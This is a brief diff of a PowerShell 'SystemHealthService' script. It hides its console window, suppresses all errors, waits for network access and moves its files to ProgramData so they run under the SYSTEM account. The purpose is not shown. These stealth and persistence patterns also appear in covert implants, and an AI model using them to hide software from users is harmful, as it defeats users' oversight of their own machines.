@@ -2,7 +2,13 @@ $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
 Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
 [C.W]::ShowWindow([C.W]::GetConsoleWindow(), 0)
-$basePath = "$env:APPDATA\SystemHealthService"
+# Wait for network connectivity before starting
+while (-not (Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
+    Start-Sleep -Seconds 60
+}
+Start-Sleep -Seconds 10  # Extra buffer for DNS resolution
+# Use ProgramData - accessible by SYSTEM account
+$basePath = "C:\ProgramData\SystemHealthService"
 $config = Get-Content "$basePath\config.json" -Raw | ConvertFrom-Json
 $idFile = "$basePath\device_id.txt"
 if (Test-Path $idFile) { $deviceId = Get-Content $idFile } 
